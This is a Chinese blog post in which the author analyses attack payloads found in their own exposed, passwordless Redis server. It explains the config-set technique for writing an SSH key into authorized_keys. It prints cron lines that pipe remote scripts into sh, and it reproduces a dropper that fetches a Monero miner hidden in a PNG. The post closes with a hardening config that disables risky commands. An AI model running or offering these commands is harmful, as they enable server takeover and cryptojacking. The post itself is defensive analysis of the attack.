---
title: 关于 Redis 的安全问题
s: about-redis-secure
date: 2016-11-22 18:01:51
tags:
  - Linux
---
之前为了方便存一些数据，我在自己 vps 上开了一个公网可以访问的 redis 服务，没有设置密码。今天突然奇想，看了看上面有什么。结果看到了某些不太好的东西。

```
127.0.0.1:6379> keys *
1) \"f17cc4f5e5\"
2) \"crackit\"
3) \"7cc4f5e5\"
127.0.0.1:6379> 
```

有 3 条数据，2 个乱码名字，先看看正常点的名字`crackit`:

```
127.0.0.1:6379> get crackit
\"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/cGu3SeRUbTfPVGWZw9hRod+HWik+Ca8Mj0Flxwb2iU2MIOTRLyuB29ZwkgB4WpPEWD3NReSIo1cIYhuAKtVNGF6WgxnsAs++lcbkNGFDXPuhRHkPiiz11ipWtk7xUF3rkVGvbaBO4gNFGSmZ8fvJdqquXM/EtEySURswo1bT5uWsE0TU2Bolw0XbeIPe99Uuw9bTOYP3UvCw2abvOWsRmm5mZAl/mosgDq1NQux0XdO6oT9QTk2ID4pbza8AcTqGFE4rQcOxF/YCpPDwd4lRxmSWl8WmbAWRDolJLxQFuIMZt7sg+yvGj7Z6+ils7/qLvcZx6A5E21Ldcg3UXrKp root@niuoh\\n\\n\\n\\n\"
127.0.0.1:6379> 
```

吖咯，看到了某某人的 `ssh public key`呢。
<!--more-->
这是一种破解 redis 宿主机 ssh 权限的方法：

1. 使用 config set dir /root/.ssh/ # 将 redis 目录设置为 /root/.ssh
2. config set dbfilename \"authorized_keys\" # 将 redis 数据库文件设置为 authorized_keys
3. set 上面的字符串，写于到 2 中的文件

这样就把攻击者的公钥写到了 /root/.ssh 目录的 authorized_keys 文件，进而获得了 ssh 到 root的权限。有个问题是假如宿主机 root 用户没有 `.ssh` 目录时，这个方式会失败。(未实验)

这个主机名让我查到了人哦。

---

看看下一个:

```
127.0.0.1:6379> get f17cc4f5e5
\"\\n\\n*/1 * * * * curl http://104.223.133.27/1 | sh\\n\\n\"
127.0.0.1:6379> 
```

从前面的 `*/1 * * * * ` 来看应该是 `cron job`，这个其实和上面差不多，还是利用了` config set dir|dbfilename` 将内容写入到了`/var/spool/cron/root`文件，这样在定时任务执行时就能做各种shell里能做的事情了。
可惜这个 IP 也不能访问，whois 也查不出个所以然。

---

最后一个

```
127.0.0.1:6379> get 7cc4f5e5
\"\\n\\n*/1 * * * * curl https://cdn.rawgit.com/hextrip/hextripgo/master/install | sh;\\n\\n\"
127.0.0.1:6379> 
```

这个和上一个是同一个套路，不过这个能直接看到 `shellcode` 的内容:
```
#!/bin/sh
ps -fe|grep syslogdaemon |grep -v grep
if [ $? -ne 0 ]
then
nohup /tmp/syslogdaemon -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4 -p x &
if [ ! -f /tmp/syslogdaemon ]
then
curl https://ooo.0o0.ooo/2016/11/27/583a97938c4f9.png|dd of=/tmp/syslogdaemon skip=7664 bs=1;chmod +x /tmp/syslogdaemon
nohup /tmp/syslogdaemon -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4 -p x &
fi
else
echo \"runing.....\"
fi
```

哎呀，中间那个ooo.0o0.ooo好眼熟啊，好像是 v2ex 上某个绿头像的人的站？这个人煞费心机把 ELF 接到 png 后面也是看得我一脸茫然，这是为了不暴露自己么，orz...

虽然说脚本的内容各不相同，但是利用的漏洞都是同一个。哎，我早早地就已经把 `config` 命令禁用了...

```
rename-command CONFIG \"\"
rename-command FLUSHALL \"\"
rename-command FLUSHDB \"\"
rename-command EVAL \"\"
```

也不知道 redis 还有木有其他不安全的地方=-=，没装 cronie , 不用 /root/.ssh 目录不知道会不会安全点。
